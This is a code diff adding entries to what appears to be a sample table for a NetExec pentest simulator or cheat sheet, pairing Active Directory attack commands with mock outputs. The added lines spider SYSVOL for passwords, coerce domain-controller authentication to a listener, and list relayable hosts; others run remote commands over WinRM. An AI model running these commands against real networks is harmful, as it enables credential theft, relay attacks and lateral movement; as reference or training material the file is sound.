@@ -57,6 +57,9 @@ var sample = {
   'smb-disks':         { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --disks", ok: D + 'C$', neg: D + '[-] access denied' },
   'smb-computers':     { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --computers", ok: D + 'DC01$\n' + D + 'WEB01$', neg: D + '[-] access denied' },
   'smb-pass-pol':      { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --pass-pol", ok: D + 'Minimum password length: 7', neg: D + '[-] access denied' },
+  'smb-spider':        { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 --spider SYSVOL --regex passw --content", ok: D + '//10.10.10.10/SYSVOL/scripts/backup.config\n' + D + 'found: web.config', neg: D + '[-] no readable shares' },
+  'smb-coerce-plus':   { cmd: "nxc smb 10.10.10.10 -u jdoe -p Winter2021 -M coerce_plus -o LISTENER=10.0.0.5", ok: 'COERCE_PLUS 10.10.10.10 445 DC [+] VULNERABLE, DFSCoerce\nCOERCE_PLUS 10.10.10.10 445 DC [+] Attack success, received connection', neg: 'COERCE_PLUS 10.10.10.10 445 DC [-] not vulnerable' },
+  'smb-gen-relay-list':{ cmd: "nxc smb 10.0.0.0/24 --gen-relay-list relay.txt", ok: D + 'Writing hosts with SMB signing disabled to relay.txt', neg: D + '[-] no hosts' },
 
   'ldap-auth':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021", ok: L + '[+] corp.local\\jdoe:Winter2021', neg: L + '[-] corp.local\\jdoe:Winter2021 STATUS_LOGON_FAILURE' },
   'ldap-users':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --users", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + '-Username-     -Last PW Set-\n' + L + 'administrator  2021-01-02\n' + L + 'svc-sql        2020-05-05', neg: L + '[-] STATUS_ACCESS_DENIED' },
@@ -72,6 +75,7 @@ var sample = {
   'ldap-group':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M group -o GROUP=Domain\\ Admins", ok: L + 'Members of Domain Admins:\n' + L + 'administrator\n' + L + 'svc-adm', neg: L + '[-] access denied' },
   'ldap-password-not-required': { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --password-not-required", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + 'guest\n' + L + 'kiosk', neg: L + '[-] access denied' },
   'ldap-maq':          { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 -M maq", ok: L + '[*] MachineAccountQuota: 10', neg: L + '[-] access denied' },
+  'ldap-query':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --query '(objectSid=*-1103)' sAMAccountName", ok: L + 'sAMAccountName: svc-sql', neg: L + '[-] access denied' },
 
   'winrm-auth':        { cmd: "nxc winrm 10.10.10.10 -u jdoe -p Winter2021", ok: W + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)', neg: W + '[-] corp.local\\jdoe:Winter2021' },
   'winrm-exec':        { cmd: "nxc winrm 10.10.10.10 -u jdoe -p Winter2021 -x whoami", ok: W + '[+] corp.local\\jdoe:Winter2021 (Pwn3d!)\n' + W + 'corp\\jdoe', neg: W + '[-] corp.local\\jdoe:Winter2021' },
